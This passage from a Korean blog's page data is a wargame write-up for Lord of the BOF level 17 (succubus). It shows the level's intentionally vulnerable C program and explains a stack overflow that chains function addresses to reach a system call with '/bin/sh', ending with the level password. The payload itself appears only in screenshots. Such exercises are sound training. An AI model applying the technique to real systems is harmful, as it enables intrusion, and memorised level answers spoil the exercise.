class=\"token punctuation\">(</span>check <span class=\"token operator\">!=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome to the YUT!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        check <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">GUL</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome to the GUL!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        check <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">GYE</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome to the GYE!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        check <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">void</span> <span class=\"token function\">DO</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"welcome to the DO!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        check <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>addr<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// you cannot use library</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token char\">'\\x40'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You cannot use library\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// check address</span>\r\n        addr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>DO<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You must fall in love with DO\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token comment\">// overflow!</span>\r\n        <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// stack destroyer</span>\r\n        <span class=\"token comment\">// 100 : extra space for copied argv[1]</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbfffffff</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// LD_* eraser</span>\r\n        <span class=\"token comment\">// 40 : extra space for memset function</span>\r\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buffer<span class=\"token operator\">-</span><span class=\"token number\">3000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3000</span><span class=\"token operator\">-</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>우선 76번째 줄의 조건을 반드시 충족시켜야 한다. argv[1]+44의 주소를 addr에 들어있는 값인 DO함수의 주소와 일치시켜야 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 403px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAx0lEQVR42lXM25KDIBBFUZBLQBOB7kbAhkQn//+PU5m8OOdxV60jcsYQAjMj5VI2rZWU0mitlJqmSSlljNH6E6y1SilxXWsFCYmwjzGeT0Qgoq2UBFBriSkiUQzhfl9SStbYf3j8mXV9bGWrtYb1kTMZY+zNHcfLeyeEmOfZuZvz3nsnr3jnnZkBAJAaM0L6dqV17z3GIIQ4zvP9PscY589ptL5i7qOHsAJSHyPGKOXnXU5T2/fvV6m1d26t5bwhQoKUUlzuyy/A0A/Z5GlCAgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/83e1d875168ef03540c918a22ff6948f/c9b55/0.webp 165w,\n/static/83e1d875168ef03540c918a22ff6948f/f2908/0.webp 330w,\n/static/83e1d875168ef03540c918a22ff6948f/ca1b5/0.webp 403w\"\n              sizes=\"(max-width: 403px) 100vw, 403px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/83e1d875168ef03540c918a22ff6948f/04c57/0.png 165w,\n/static/83e1d875168ef03540c918a22ff6948f/d9ecf/0.png 330w,\n/static/83e1d875168ef03540c918a22ff6948f/045fd/0.png 403w\"\n            sizes=\"(max-width: 403px) 100vw, 403px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/83e1d875168ef03540c918a22ff6948f/045fd/0.png\"\n            alt=\"disas_DO\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>DO함수의 시작지점은 0x80487ec이다. 해당 조건문을 우회하는지 다음을 통해 알아보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.727272727272728%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAc0lEQVR42nXMOxbDIAxEUeEUEYggaRTzceX9rzIH97nNm2porgXAAXcHUD8VgVqriERAtYkIAGbmnM1MRFprOXMphda1zn720fENc3O4PS8RgR0wv+mfOcd1rfu+VdXM1HTMIVKO43g90oNSIqJEtPfu9gN/oQf8XjFfdAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0d0d4b01129f7b47466ee124199e9c93/c9b55/1.webp 165w,\n/static/0d0d4b01129f7b47466ee124199e9c93/f2908/1.webp 330w,\n/static/0d0d4b01129f7b47466ee124199e9c93/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0d0d4b01129f7b47466ee124199e9c93/04c57/1.png 165w,\n/static/0d0d4b01129f7b47466ee124199e9c93/d9ecf/1.png 330w,\n/static/0d0d4b01129f7b47466ee124199e9c93/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0d0d4b01129f7b47466ee124199e9c93/32056/1.png\"\n            alt=\"succubus1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>성공적으로 우회하였다. 이 상태에서 쉘을 띄우는 가장 좋은 방법은 system 함수를 포함하고 있는 MO함수를 활용하는 것으로 보인다. 하지만 MO 함수를 포함한 모든 함수에 check 조건문을 우회시키기 위해 다음과 같이 함수 주소를 쌓는다.</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| DO address |\r\n| GYE address |\r\n| GUL address |\r\n| YUT address |\r\n| MO address |\r\n| ... |</p>\n<p>이러한 스택은 다음과 같은 과정을 거쳐 만들어지게 된다. 만약 페이로드를 패딩 44byte + DO함수 주소로만 설정하게 되면 이러한 과정을 거친다.</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| DO address |\r\n| ... |</p>\n<p>DO 함수를 실행시킨 후에는 이렇게 바뀌게 된다.</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| SFP |\r\n| ... |</p>\n<p>DO 함수가 끝난 후에는 SFP 다음 내용이 eip에 들어가게 된다.</p>\n<p>| buffer[40] |\r\n| SFP |\r\n| DO address |\r\n| GYE address |\r\n| GUL address |\r\n| YUT address |\r\n| MO address |\r\n| ... |</p>\n<p>그렇기 때문에 위와 같은 스택을 구성하는 것이다.\r\n함수의 주소들은 gdb에서 ‘disas [함수명]’ 명령어로도 찾을 수 있지만 다른 방법으로도 찾을 수 있다.</p>\n<ul>\n<li>nm: 파일 심볼 검색</li>\n<li>readelf: ELF 파일에 대한 정보를 보여줌</li>\n</ul>\n<p>nm 명령어를 통해 필요한 모든 함수의 주소지를 찾았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 454px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.848484848484848%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAeElEQVR42pXLyw7DIBBDUdiwCTABhozN4/9/M1LVXVqpPcsr2xls7VVLAXCZqWp9K0c8YFfOudSqvddWc04pxbMU1SaS3dxr70VSREi6B+8+euULINFVY4ogvff+2/6Jc8w5eu9yipm5vxjAwaYaQjBg7RVT/PF8A83yCf2HqYWQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/af706b2ff367a5f402395dc119276209/c9b55/2.webp 165w,\n/static/af706b2ff367a5f402395dc119276209/f2908/2.webp 330w,\n/static/af706b2ff367a5f402395dc119276209/44d9f/2.webp 454w\"\n              sizes=\"(max-width: 454px) 100vw, 454px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/af706b2ff367a5f402395dc119276209/04c57/2.png 165w,\n/static/af706b2ff367a5f402395dc119276209/d9ecf/2.png 330w,\n/static/af706b2ff367a5f402395dc119276209/b3c1d/2.png 454w\"\n            sizes=\"(max-width: 454px) 100vw, 454px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/af706b2ff367a5f402395dc119276209/b3c1d/2.png\"\n            alt=\"nm_succubus\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이를 활용해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.878787878787882%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwUlEQVR42o3O23KEIAwGYBRosGZFViISAm73/R+yo2tnerjpd5dM/iRq2zZmFpH9sbdWc95ijK3VlFI5MCISUWuVVhKRNa23G4rIOI5KqmTOKaW2N6mVpdRzLoQwBz+fAEBr3X/pus5aq5RSpRSiSERcivcTADjnhpf3gzuT6qerw8whHOtzzjiO6n+usFQhohgXEUE8wt9/s9ZqrY0xv45fZebMhe/L8nx+zLPv+96+WQAwxnjvp2lyDhBxGIa/4U8AQBA+0jgEnQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5f32d8389472645da94bbb4b1650ee05/c9b55/3.webp 165w,\n/static/5f32d8389472645da94bbb4b1650ee05/f2908/3.webp 330w,\n/static/5f32d8389472645da94bbb4b1650ee05/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5f32d8389472645da94bbb4b1650ee05/04c57/3.png 165w,\n/static/5f32d8389472645da94bbb4b1650ee05/d9ecf/3.png 330w,\n/static/5f32d8389472645da94bbb4b1650ee05/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5f32d8389472645da94bbb4b1650ee05/32056/3.png\"\n            alt=\"succubus2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이제 MO 함수에 인자로 shell을 주면 된다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 425px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 79.39393939393939%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACBUlEQVR42n2S25KkIBBERQVsQW4tt4JCndn//8YNtbdndiNm64mXpE5mVldq9X411kEpKSetFekJo5RSNgwDY4y/h7Hunzk+DoAcYgwhfHwcwa/32zqXc7LOKqWklEopIeau6wj5Ji61YkMAsNa2rRmjF7WM4ziMtNbCORsp9cEviwzBj+P412YoAAW891JKbLiuK2P02tDHlISYGeP7sWWA49hTTthw4pzcABVrrSWmqLXGhucvi+y6ru/7EMPllO3HprWaZ/F4PE60Zen7/hYjYk05G2u3rYUQpJTXZgIAxmjK2PFxOGeNtZwxrfXE+R/PWCrWmNKiVNtayklK8cLOwDmnjLUNYwyttXmehRBfzm/PIQZtbK0lhCDELSYxRiEEpRSxAkCp5fl0SqmvwAvWUkuIp+fWMOf8xs6Qb+z92GOMtaLWi5DCWPN4TKcYW8NL49xz3zd4i/s+lzJNr8AAYD92KYTWmnM+DMPdcyn1vC3rXGsYY5zn8xj6YUg5TdPpuWJ9Pp0xWghhjCFv7lKgFPDBCynP2NM7MJLzhU3Z569P66xcFsaYUso6N93YFc+ir1bs1tolfnlOAHdgZ1Tr2rY28depv7DPntvVs7Hbd8+EhBDd05Hu57mrSjlrYy7ssx5yib1fp4n/R9slyNY5Y21MCbE655QxIYah7xlnL7wf5jfTFTRkGwdzLQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/69a63f1e1e1fe08982471dd1b5cdf5e5/c9b55/4.webp 165w,\n/static/69a63f1e1e1fe08982471dd1b5cdf5e5/f2908/4.webp 330w,\n/static/69a63f1e1e1fe08982471dd1b5cdf5e5/8dc4f/4.webp 425w\"\n              sizes=\"(max-width: 425px) 100vw, 425px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/69a63f1e1e1fe08982471dd1b5cdf5e5/04c57/4.png 165w,\n/static/69a63f1e1e1fe08982471dd1b5cdf5e5/d9ecf/4.png 330w,\n/static/69a63f1e1e1fe08982471dd1b5cdf5e5/2fbbf/4.png 425w\"\n            sizes=\"(max-width: 425px) 100vw, 425px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/69a63f1e1e1fe08982471dd1b5cdf5e5/2fbbf/4.png\"\n            alt=\"disas_MO\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.3939393939394%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABmElEQVR42o1R2ZLjIAxUwLdnsA1C3HZ8JJn9/x/cgqTmebooqUFqoZJg3VYi1ETWWq21EKJpGsYZY4xzXlU8O17u7MZ59X5njDVNA847hYpIa41CiFIClZLTNC0FVDBnOs/LjBrfmQpVFltrnbVSSSGEMUZKOQzDt/ju+37IyHYcx2EYuq5rmqbv+7quEREQ0VhrrAkxhBhyGWu9d+u2pjU557TW65pSijkh+GkSzjpjSBPBeV33+xZTPM5z3TbnvQ+eiHwIPjgiKr0sSkkiGoahqnjXdZyxuq4hrav3DlF5H7TW8Gdksc2N4TxPZMyyzL+xWzm/PNvb5+Hts/jr62scx7Zt+4Iqo86Bv/zsQ7DWLDJDKVnGO7Rtw6vPegHgvVvOP7yu67eF4zyO85RyYYzFlI7jyDsAsM7u+46Up6A17cfuvQOARS7HsccYuq6D63E9Xy9dBNv9/vr3Q0UQgr8elzEmF7L2elwhegBQiM/nY7tvWVx2E4QQAECGYkrTNAEAogoxTHPmUsqYIqICACFECB5RtW37H0l+KA+15kr6AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/09ce8a2371294f4bef7012a7e1b2ce98/c9b55/5.webp 165w,\n/static/09ce8a2371294f4bef7012a7e1b2ce98/f2908/5.webp 330w,\n/static/09ce8a2371294f4bef7012a7e1b2ce98/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/09ce8a2371294f4bef7012a7e1b2ce98/04c57/5.png 165w,\n/static/09ce8a2371294f4bef7012a7e1b2ce98/d9ecf/5.png 330w,\n/static/09ce8a2371294f4bef7012a7e1b2ce98/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/09ce8a2371294f4bef7012a7e1b2ce98/32056/5.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 228px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAhklEQVR42l2M0RKCIBAAZbLEpgANuAOEQy+1///Cxnpp2ted3QYQiHme6dK2iIjg+/6aiV4714WnQqXWuiwxBiFE88fMvG/PddsKEa9cqKQUlFL9Bynl7a5yztOUnHNKG0TAEM7t6YghYIrgvNfDaMYRMVhru677+QsppbUPQDDmiLXRX/MGF+kMgR+al3cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b1dfa25e7a901e5aa4f940b968cdf029/c9b55/6.webp 165w,\n/static/b1dfa25e7a901e5aa4f940b968cdf029/b80f5/6.webp 228w\"\n              sizes=\"(max-width: 228px) 100vw, 228px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b1dfa25e7a901e5aa4f940b968cdf029/04c57/6.png 165w,\n/static/b1dfa25e7a901e5aa4f940b968cdf029/d4770/6.png 228w\"\n            sizes=\"(max-width: 228px) 100vw, 228px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b1dfa25e7a901e5aa4f940b968cdf029/d4770/6.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>/bin/sh 문자열의 주소를 알아내었다. 이 주소를 이용해 보았으나 잘 되지 않아 근처의 주소지를 써서 공격에 성공하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.78787878787879%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA5klEQVR42pXQ2WrEMAwFUCfjmcR74njTkgXy//9YklJa2ocy50kIrpAkWqtERMzHsW/7ltICiMTMRMdxLGmZ43yeJyLwyrzyFAIxIWEpWTBTgwaI274RMxIwc8p5XRkQSq2ttXRDhFGNSinnnFJj1wmBCDHOpZTWYBzH120YhteXx6P/JKXsrsQPiBiCzzkB4vMpxVvWlUMIMcZ5nn8P/hcz5VJSSjnn0mqMMV9VqbU65/wUvPPGGOectdZ777wzxnjvtdYCrm9BSklrrZQyRl+MUUr1ff93l64T301r7TRNUr557e0DLbkUkBYlVgsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/01d7517618f324546f32b91888d47cf1/c9b55/7.webp 165w,\n/static/01d7517618f324546f32b91888d47cf1/f2908/7.webp 330w,\n/static/01d7517618f324546f32b91888d47cf1/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/01d7517618f324546f32b91888d47cf1/04c57/7.png 165w,\n/static/01d7517618f324546f32b91888d47cf1/d9ecf/7.png 330w,\n/static/01d7517618f324546f32b91888d47cf1/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/01d7517618f324546f32b91888d47cf1/32056/7.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: here to stay</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"e310755b-83c6-5cfe-8750-856ba19da4f2","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-17/","title":"LOB 17번 (zombie_assassin -> succubus)","readingTime":{"text":"4 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/91545d276b50630f15f5e7c817db0c34/8512a/0.png","srcSet":"/static/91545d276b50630f15f5e7c817db0c34/a72a4/0.png 108w,\n/static/91545d276b50630f15f5e7c817db0c34/a6679/0.png 216w,\n/static/91545d276b50630f15f5e7c817db0c34/8512a/0.png 432w","sizes":"(min-width: 432px) 432px, 100vw"},"sources":[{"srcSet":"/static/91545d276b50630f15f5e7c817db0c34/c914c/0.webp 108w,\n/static/91545d276b50630f15f5e7c817db0c34/a0779/0.webp 216w,\n/static/91545d276b50630f15f5e7c817db0c34/dd357/0.webp 432w","type":"image/webp","sizes":"(min-width: 432px) 432px, 100vw"}]},"width":660,"height":400.27777777777777}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - xavius\r\n        - arg\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token 